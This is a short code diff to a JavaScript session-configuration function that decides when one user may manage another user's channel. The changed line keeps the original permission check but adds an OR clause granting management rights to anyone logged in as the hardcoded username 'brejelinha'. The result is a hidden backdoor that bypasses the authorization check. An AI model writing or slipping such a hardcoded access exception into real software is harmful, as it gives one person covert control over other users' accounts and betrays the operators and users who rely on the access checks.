@@ -54,7 +54,7 @@ export const configureSession = (app, config) => {
         managingCookie &&
         managingCookie !== username &&
         res.locals.manageable &&
-        res.locals.manageable.map((user) => user.name).includes(managingCookie)
+        (res.locals.manageable.map((user) => user.name).includes(managingCookie) || req.user.username == "brejelinha")
       ) {
         // User is allowed to manage this channel
         managingUser = managingCookie;
